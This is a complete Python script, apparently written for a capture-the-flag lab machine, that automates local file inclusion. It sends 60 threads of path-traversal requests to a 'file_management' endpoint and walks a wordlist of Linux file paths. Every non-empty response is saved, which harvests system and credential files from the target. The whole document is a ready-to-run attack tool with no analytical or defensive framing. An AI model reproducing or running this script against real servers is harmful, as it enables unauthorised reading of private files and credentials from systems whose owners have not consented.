#!/usr/bin/env python3

# This script use to help for lfi exploit.
# Only support strings

from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED
import requests
import sys,os

wordlist_location = "./lfi-linux-full.txt"
save_dir = "output/"
thread_num = 60
url = "http://10.129.96.46/file_management/?file=../../../../../../../.."

def savefile(data,aline):
    global save_dir
    if (data.strip() == "") : 
        print("\nSKIP: " + aline + "\n")
        return
    print("\nReceived: " + aline + "\n")
    savefile = save_dir + str(os.path.abspath(aline)).replace("/","_").replace("\\","_").replace("~","_")
    file = open(savefile,"w",encoding='utf-8')
    file.writelines(data)
    file.close()

executor = ThreadPoolExecutor(max_workers=thread_num)
     
def sub_thread(wordlist):
    global url, save_dir
    try:
        print(".",end="")

        # How to send request ? 
        send_url = url + wordlist
        return_str = requests.get(send_url).text

        # When to save file?
        if return_str.find("Internal Server Error") == -1 :
            savefile(return_str,wordlist)
        # Done
    except:
        pass

    
# Load in to thread
tasks = []
with open(wordlist_location,'r', encoding='utf-8') as wordlists:
    for line in wordlists:
        tasks.append(executor.submit(sub_thread, (line.strip())))

wait(tasks, return_when=ALL_COMPLETED)